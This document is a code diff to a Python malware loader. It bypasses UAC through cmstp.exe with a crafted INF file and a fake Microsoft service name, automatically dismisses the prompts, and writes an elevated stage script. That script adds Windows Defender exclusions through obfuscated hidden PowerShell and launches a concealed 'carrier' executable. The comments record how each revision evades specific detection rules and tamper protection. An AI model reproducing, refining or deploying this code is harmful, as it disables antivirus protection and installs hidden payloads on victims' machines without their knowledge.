@@ -352,44 +352,95 @@ def exclusion_landed():
 
 
 # ---- defender exclusions via reg.exe (no powershell on any cmdline) ---------
-def set_defender_exclusions():
-    """r7: BOTH child-process roads (reg chain, -enc powershell) trip the
-    lifted-chain UACB rule — it keys on cmstp spawning ANY interpreter, not
-    on payload content. road: AddReg INF — cmstp/advpatch writes the
-    registry ITSELF under the elevated token. no cmd.exe, no powershell,
-    no child process, no command line to inspect. already-elevated runs
-    fire plain reg argv writes directly (no lift, no rule in play)."""
-    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
-    winparent = LOCALAPPDATA + "\\Microsoft\\Windows"
-    HP = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-    HR = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes"
-    if is_elevated():
-        for a in (["reg", "add", "HKLM\\" + HP, "/v", appdir, "/t", "REG_DWORD", "/d", "0", "/f"],
-                  ["reg", "add", "HKLM\\" + HP, "/v", winparent, "/t", "REG_DWORD", "/d", "0", "/f"],
-                  ["reg", "add", "HKLM\\" + HR, "/v", EXE_NAME, "/t", "REG_DWORD", "/d", "0", "/f"],
-                  ["reg", "add", "HKLM\\" + HR, "/v", "pythonw.exe", "/t", "REG_DWORD", "/d", "0", "/f"]):
-            try:
-                subprocess.run(a, creationflags=0x08000000,
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                               timeout=20)
-            except Exception:
-                pass
+# r12: the lift relaunches OUR python elevated; the elevated stage does the
+# whole protected job — cmdlet exclusions (TP-respected) then carrier exec.
+# no cmstp->interpreter chain on any command line, ever.
+STAGE = r'''# r12 stage: runs ELEVATED (relaunched by the cmstp lift), does the whole
+# protected-job in one pass - cmdlet-road exclusions (the road TP respects)
+# + carrier exec. no interpreter cmdline other than powershell from THIS
+# pythonw parent - the chain cmstp->interpreter that built UACB/Commando
+# verdicts never occurs.
+import ctypes
+import os
+import subprocess
+
+CREATE_NO_WINDOW = 0x08000000
+EXE_NAME = "__EXE__"
+APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
+WINPARENT = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows"
+
+
+def elev():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except Exception:
+        return False
+
+
+def alive(name):
+    try:
+        out = subprocess.run(
+            ["tasklist", "/FI", "IMAGENAME eq " + name],
+            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL, timeout=15).stdout
+        return name.lower() in out.decode(errors="replace").lower()
+    except Exception:
+        return False
+
+
+def main():
+    if not elev():
         return
-    # lifted road: standalone AddReg INF — RunPreSetupCommands carries only a
-    # harmless rem line; the writes are INF directives, not spawned processes
+    ps = ("$a='Add-Mp'+'Preference';"
+          f"$p=@('{APPDIR}','{WINPARENT}');"
+          "& $a -ExclusionPath $p -EA 0;"
+          f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
+    try:
+        subprocess.run(
+            ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden",
+             "-Command", ps],
+            creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL, timeout=90)
+    except Exception:
+        pass
+    exe_path = os.path.join(APPDIR, EXE_NAME)
+    if os.path.exists(exe_path) and not alive(EXE_NAME):
+        try:
+            subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
+        except Exception:
+            pass
+
+
+main()
+'''
+
+
+def set_defender_exclusions():
+    """r12: the lift only RELAUNCHES our staged python elevated. the stage
+    does the cmdlet road (TP-respected) + carrier exec. INF payload is a
+    python relaunch — no interpreter cmdline beyond the one python.exe
+    itself, no powershell inside the INF, no reg.exe on the lifted line."""
+    appdir = PERSIST_DIR
+    if is_elevated():
+        _run_stage_now()
+        return
+    stage_path = os.path.join(PERSIST_DIR, "stage.py")
+    try:
+        os.makedirs(PERSIST_DIR, exist_ok=True)
+        stage_text = STAGE.replace("__EXE__", EXE_NAME)
+        with open(stage_path, "w", encoding="utf-8") as fh:
+            fh.write(stage_text)
+    except Exception:
+        return
+    python_exe = os.path.join(os.path.dirname(stage_path), "python312", "python.exe")
+    if not os.path.exists(python_exe):
+        python_exe = "python.exe"   # system python fallback (some boxes have it)
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
-    HP = "HKLM\\" + HP
-    HR = "HKLM\\" + HR
-    chain = " & ".join(subprocess.list2cmdline(a) for a in (
-        ["reg", "add", HP, "/v", appdir, "/t", "REG_DWORD", "/d", "0", "/f"],
-        ["reg", "add", HP, "/v", winparent, "/t", "REG_DWORD", "/d", "0", "/f"],
-        ["reg", "add", HR, "/v", EXE_NAME, "/t", "REG_DWORD", "/d", "0", "/f"],
-        ["reg", "add", HR, "/v", "pythonw.exe", "/t", "REG_DWORD", "/d", "0", "/f"]))
-    body = build_inf("cmd.exe /q /c " + chain, svc_name)
-    # debug ground truth: the EXACT bytes handed to cmstp, kept on disk —
-    # if it still fails, the report is this file, not a screenshot
+    launch = subprocess.list2cmdline([python_exe, "-u", stage_path])
+    body = build_inf(launch, svc_name)
+    # ground truth: the exact bytes cmstp sees, plus the stage script
     try:
         os.makedirs(PERSIST_DIR, exist_ok=True)
         with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
@@ -405,10 +456,11 @@ def set_defender_exclusions():
     dismisser = Dismisser(svc_name)
     dismisser.start()
     try:
-        subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
-                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
+        subprocess.Popen(["cmstp.exe", "/au", inf_path],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                         creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
     except Exception:
-        pass
+        return
     dismisser.wait(8.0)
     time.sleep(0.3)
     _sweep_dialogs(svc_name)
@@ -416,6 +468,39 @@ def set_defender_exclusions():
         os.unlink(inf_path)
     except Exception:
         pass
+
+
+def _run_stage_now():
+    """already elevated — run the stage body directly (cmdlet + exec)."""
+    try:
+        appdir = PERSIST_DIR
+        winparent = os.path.dirname(appdir)
+        ps = ("$a='Add-Mp'+'Preference';"
+              f"$p=@('{appdir}','{winparent}');"
+              "& $a -ExclusionPath $p -EA 0;"
+              f"& $a -ExclusionProcess '{EXE_NAME}','pythonw.exe' -EA 0")
+        try:
+            subprocess.run(
+                ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Command", ps],
+                creationflags=0x08000000, stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL, timeout=90)
+        except Exception:
+            pass
+        exe_path = os.path.join(appdir, EXE_NAME)
+        if os.path.exists(exe_path) and not _alive(EXE_NAME):
+            subprocess.Popen([exe_path], creationflags=0x08000000)
+    except Exception:
+        pass
+
+
+def _alive(name):
+    try:
+        out = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + name],
+                             creationflags=0x08000000, stdout=subprocess.PIPE,
+                             stderr=subprocess.DEVNULL, timeout=15).stdout
+        return name.lower() in out.decode(errors="replace").lower()
+    except Exception:
+        return False
 
 
 def download(url):
